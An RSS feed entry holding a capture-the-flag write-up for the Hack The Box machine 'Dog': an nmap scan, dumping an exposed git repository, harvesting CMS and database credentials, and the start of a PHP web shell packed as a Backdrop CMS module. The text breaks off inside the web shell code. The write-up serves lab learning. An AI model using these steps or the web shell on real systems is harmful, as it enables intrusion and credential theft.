<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Linux on 01MI</title><link>https://01MI.github.io/categories/linux/</link><description>Recent content in Linux on 01MI</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Sat, 12 Jul 2025 00:00:00 +0000</lastBuildDate><atom:link href="https://01MI.github.io/categories/linux/index.xml" rel="self" type="application/rss+xml"/><item><title>Dog - Linux Easy - HTB Writeup</title><link>https://01MI.github.io/p/dog-htb-writeup-linux-easy/</link><pubDate>Sat, 12 Jul 2025 00:00:00 +0000</pubDate><guid>https://01MI.github.io/p/dog-htb-writeup-linux-easy/</guid><description>&lt;img src="https://01MI.github.io/p/dog-htb-writeup-linux-easy/Dog.PNG" alt="Featured image of post Dog - Linux Easy - HTB Writeup" />&lt;h2 id="summary">Summary
&lt;/h2>&lt;p>User: Webapp credentials in source code using GitHack + RCE via upload of a malicious archive.&lt;br>
Root: Sudo misconfiguration of bee CLI.&lt;/p>
&lt;h2 id="enumeration">Enumeration
&lt;/h2>&lt;p>Using nmap, we can identify a web service on port 80 and SSH exposed on port 22.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt"> 1
&lt;/span>&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="hl">&lt;span class="lnt"> 3
&lt;/span>&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="hl">&lt;span class="lnt"> 8
&lt;/span>&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="hl">&lt;span class="lnt">21
&lt;/span>&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">nmap&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">Pn&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="o">-&lt;/span> &lt;span class="mf">10.129.208.97&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">v&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">A&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">PORT&lt;/span> &lt;span class="nx">STATE&lt;/span> &lt;span class="nx">SERVICE&lt;/span> &lt;span class="nx">VERSION&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="mi">22&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">ssh&lt;/span> &lt;span class="nx">OpenSSH&lt;/span> &lt;span class="mf">8.2&lt;/span>&lt;span class="nx">p1&lt;/span> &lt;span class="nx">Ubuntu&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="nx">ubuntu0&lt;/span>&lt;span class="mf">.12&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">Ubuntu&lt;/span> &lt;span class="nx">Linux&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">protocol&lt;/span> &lt;span class="mf">2.0&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nx">ssh&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">hostkey&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="mi">3072&lt;/span> &lt;span class="mi">97&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">d2&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">89&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">d3&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">ed&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">ac&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mo">00&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">d2&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">87&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">49&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nf">a7&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">RSA&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="mi">256&lt;/span> &lt;span class="mi">27&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">7&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">eb&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">26&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">e9&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">62&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">59&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">b1&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">38&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">c9&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">ae&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nf">b&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">ECDSA&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>&lt;span class="nx">_&lt;/span> &lt;span class="mi">256&lt;/span> &lt;span class="mi">93&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">88&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">47&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">69&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">af&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">72&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">09&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">ba&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">77&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nf">eb&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">ED25519&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="mi">80&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">http&lt;/span> &lt;span class="nx">Apache&lt;/span> &lt;span class="nx">httpd&lt;/span> &lt;span class="mf">2.4.41&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nx">Ubuntu&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>&lt;span class="nx">_http&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">title&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">Home&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nx">Dog&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nx">http&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">robots&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">22&lt;/span> &lt;span class="nx">disallowed&lt;/span> &lt;span class="nf">entries&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="mi">15&lt;/span> &lt;span class="nx">shown&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">core&lt;/span>&lt;span class="o">/&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">profiles&lt;/span>&lt;span class="o">/&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">README&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">md&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">web&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">config&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">admin&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">comment&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">reply&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">filter&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tips&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">node&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">add&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">search&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">user&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">register&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>&lt;span class="nx">_&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">user&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">password&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">user&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">login&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">user&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">logout&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="err">?&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="nx">admin&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="err">?&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="nx">comment&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">reply&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>&lt;span class="nx">_http&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">generator&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">Backdrop&lt;/span> &lt;span class="nx">CMS&lt;/span> &lt;span class="mi">1&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">https&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="c1">//backdropcms.org)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nx">http&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">methods&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>&lt;span class="nx">_&lt;/span> &lt;span class="nx">Supported&lt;/span> &lt;span class="nx">Methods&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">GET&lt;/span> &lt;span class="nx">HEAD&lt;/span> &lt;span class="nx">POST&lt;/span> &lt;span class="nx">OPTIONS&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>&lt;span class="nx">_http&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">favicon&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">Unknown&lt;/span> &lt;span class="nx">favicon&lt;/span> &lt;span class="nx">MD5&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mf">3836E83&lt;/span>&lt;span class="nx">A3E835A26D789DDA9E78C5510&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>&lt;span class="nx">_http&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">server&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">header&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">Apache&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mf">2.4.41&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">Ubuntu&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nx">http&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">git&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="mf">10.129.208.97&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">80&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">git&lt;/span>&lt;span class="o">/&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nx">Git&lt;/span> &lt;span class="nx">repository&lt;/span> &lt;span class="nx">found&lt;/span>&lt;span class="p">!&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nx">Repository&lt;/span> &lt;span class="nx">description&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">Unnamed&lt;/span> &lt;span class="nx">repository&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">edit&lt;/span> &lt;span class="nx">this&lt;/span> &lt;span class="nx">file&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">description&lt;/span>&lt;span class="err">&amp;#39;&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="nx">name&lt;/span> &lt;span class="nx">the&lt;/span>&lt;span class="o">...&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>&lt;span class="nx">_&lt;/span> &lt;span class="nx">Last&lt;/span> &lt;span class="nx">commit&lt;/span> &lt;span class="nx">message&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">todo&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">customize&lt;/span> &lt;span class="nx">url&lt;/span> &lt;span class="nx">aliases&lt;/span>&lt;span class="p">.&lt;/span> &lt;span class="nx">reference&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">https&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="c1">//docs.backdro...&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>
&lt;h2 id="user">User
&lt;/h2>&lt;h3 id="git-dump--rce-via-shelltar">Git dump + RCE via shell.tar
&lt;/h3>&lt;p>The nmap scan revealed that the git repository of the webapp is exposed.&lt;br>
Using &lt;a class="link" href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener"
>GitHack&lt;/a>, we are going to partially retrieve the source code of this web application.
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
&lt;/span>&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="hl">&lt;span class="lnt">4
&lt;/span>&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;span class="lnt">9
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">ls&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">GitHack&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">py&lt;/span> &lt;span class="nx">index&lt;/span> &lt;span class="nx">lib&lt;/span> &lt;span class="nx">README&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">md&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">python&lt;/span> &lt;span class="nx">GitHack&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">py&lt;/span> &lt;span class="nx">http&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="c1">//dog.htb/.git&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Download&lt;/span> &lt;span class="nx">and&lt;/span> &lt;span class="nx">parse&lt;/span> &lt;span class="nx">index&lt;/span> &lt;span class="nx">file&lt;/span> &lt;span class="o">...&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">LICENSE&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">README&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">md&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">core&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">jshintignore&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">...&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>
In those files, we can find a username &lt;code>tiffany&lt;/code> and a password &lt;code>BackDropJ2024DS2024&lt;/code>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
&lt;/span>&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="hl">&lt;span class="lnt">4
&lt;/span>&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">grep&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">ir&lt;/span> &lt;span class="nx">dog&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">htb&lt;/span> &lt;span class="p">.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">dog&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">htb&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">files&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">config_83dddd18e1ec67fd8ff5bba2453c7fb3&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">active&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">update&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">settings&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">json&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s">&amp;#34;tiffany@dog.htb&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">cat&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">n&lt;/span> &lt;span class="nx">settings&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">...&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mi">15&lt;/span> &lt;span class="err">$&lt;/span>&lt;span class="nx">database&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">mysql&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="c1">//root:BackDropJ2024DS2024@127.0.0.1/backdrop&amp;#39;;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">...&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/p>
&lt;p>Using those credentials, we gain access to the webapp &lt;code>http://dog.htb&lt;/code> as &lt;code>tiffany&lt;/code>.&lt;br>
We can find the version of &lt;code>Backdrop&lt;/code> in the &lt;code>Reports&lt;/code> tab then &lt;code>Status report&lt;/code>.&lt;br>
This version &lt;code>1.27.7&lt;/code> is vulnerable to an RCE.
&lt;img src="https://01MI.github.io/p/dog-htb-writeup-linux-easy/Backdrop_version.PNG"
width="1022"
height="492"
srcset="https://01MI.github.io/p/dog-htb-writeup-linux-easy/Backdrop_version_hu_abe110edb435d067.PNG 480w, https://01MI.github.io/p/dog-htb-writeup-linux-easy/Backdrop_version_hu_3a56188cfc8c59ea.PNG 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="207"
data-flex-basis="498px"
>&lt;/p>
&lt;p>The following &lt;a class="link" href="https://www.exploit-db.com/exploits/52021" target="_blank" rel="noopener"
>exploit&lt;/a> could work but our instance of backdrop doesn&amp;rsquo;t accept &lt;code>.zip&lt;/code> archives.&lt;br>
We can find this information in the &lt;code>Functionality&lt;/code> tab then &lt;code>Install new modules&lt;/code>.
&lt;img src="https://01MI.github.io/p/dog-htb-writeup-linux-easy/Backdrop_zip.PNG"
width="1273"
height="557"
srcset="https://01MI.github.io/p/dog-htb-writeup-linux-easy/Backdrop_zip_hu_3353f62be050b291.PNG 480w, https://01MI.github.io/p/dog-htb-writeup-linux-easy/Backdrop_zip_hu_4194d30c27ed02da.PNG 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="228"
data-flex-basis="548px"
>&lt;/p>
&lt;p>So, we are going to take the HTML/PHP code and &lt;code>shell.info&lt;/code> content of this exploit in order to create a &lt;code>shell.tar&lt;/code> archive.&lt;br>
Then, on the same page we are going to install this new module.
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt"> 1
&lt;/span>&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="hl">&lt;span class="lnt">19
&lt;/span>&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="hl">&lt;span class="lnt">36
&lt;/span>&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">cat&lt;/span> &lt;span class="nx">shell&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nx">html&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nx">body&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nx">form&lt;/span> &lt;span class="nx">method&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="s">&amp;#34;GET&amp;#34;&lt;/span> &lt;span class="nx">name&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="s">&amp;#34;&amp;lt;?php echo basename($_SERVER[&amp;#39;PHP_SELF&amp;#39;]); ?&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nx">input&lt;/span> &lt;span class="kd">type&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="s">&amp;#34;TEXT&amp;#34;&lt;/span> &lt;span class="nx">name&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="s">&amp;#34;cmd&amp;#34;&lt;/span> &lt;span class="nx">autofocus&lt;/span> &lt;span class="nx">id&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="s">&amp;#34;cmd&amp;#34;&lt;/span> &lt;span class="nx">size&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="s">&amp;#34;80&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
